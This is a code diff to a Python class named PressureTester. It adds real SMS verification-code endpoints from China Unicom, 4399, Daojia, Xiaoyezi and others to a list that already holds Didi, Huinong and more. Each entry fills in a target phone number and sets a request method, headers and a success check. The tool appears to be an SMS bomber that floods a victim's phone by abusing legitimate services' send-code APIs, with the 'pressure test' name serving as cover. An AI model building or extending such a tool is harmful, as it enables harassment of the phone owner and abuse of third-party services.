@@ -34,7 +34,16 @@ class PressureTester:
             ("快递100", "https://p.kuaidi100.com/xcx/sms/sendcode", "POST", {"name": p, "validcode": ""}, False, lambda r: r.status_code == 200, None),
             ("鑫汇融资", "http://apiyd.xinhuirongzi.com/user/get-sms-code", "POST", {"mobile": p}, True, lambda r: r.json().get("code") == 200, {"package": "com.dsrz.qianjia", "os": "android"}),
             
-            # --- 新增整合接口 (含滴滴、惠农网) ---
+            # --- 新增整合接口 (含联通、4399等) ---
+            ("联通1", f"http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal={p}&type=4", "GET", None, False, lambda r: r.status_code == 200, None),
+            ("联通2", f"http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal={p}&type=0", "GET", None, False, lambda r: r.status_code == 200, None),
+            ("联通3", f"http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal={p}&type=1", "GET", None, False, lambda r: r.status_code == 200, None),
+            ("联通4", f"http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal={p}&type=2", "GET", None, False, lambda r: r.status_code == 200, None),
+            ("4399游戏", f"https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone={p}&appId=www_home&v=1", "GET", None, False, lambda r: r.status_code == 200, None),
+            ("到家", f"https://user.daojia.com/user/getSmscode?mobile={p}&bu=", "GET", None, False, lambda r: r.status_code == 200, None),
+            ("小叶子", f"https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile={p}", "GET", None, False, lambda r: r.status_code == 200, None),
+
+            # --- 原有其他接口 ---
             ("滴滴出行", "https://epassport.diditaxi.com.cn/passport/login/v5/codeMT", "POST", f"cell={p}&appid=35011&code_type=1&sec_session_id=none", False, lambda r: r.json().get("errno") == 0, {"Content-Type": "application/x-www-form-urlencoded", "Mpxlogin-Ver": "5.5.1", "secdd-authentication": f"v1:{ts}"}),
             ("惠农网", f"https://stdch5.huinongyun.cn/api-uaa/validata/smsCode/{p}/voc", "GET", None, False, lambda r: r.status_code == 200, None),
             ("原子科技", "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code", "POST", {"mobile": p, "captcha": "1111", "token": "1111", "prefix": 86}, True, lambda r: r.json().get("code") == 200, None),
